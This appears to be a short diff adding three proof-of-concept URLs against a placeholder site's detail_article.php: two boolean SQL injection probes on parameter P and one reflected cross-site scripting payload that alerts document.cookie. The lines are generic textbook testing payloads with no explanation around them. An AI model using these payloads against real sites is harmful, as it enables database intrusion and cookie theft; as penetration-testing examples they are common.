@@ -1,0 +1,3 @@
+http://www.example.com/detail_article.php?C=3&amp;P=1 and 1=1 &lt;-- true
+http://www.example.com/detail_article.php?C=3&amp;P=1 and 1=2 &lt;-- false
+http://www.example.com/detail_article.php?C=3&amp;P=7&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
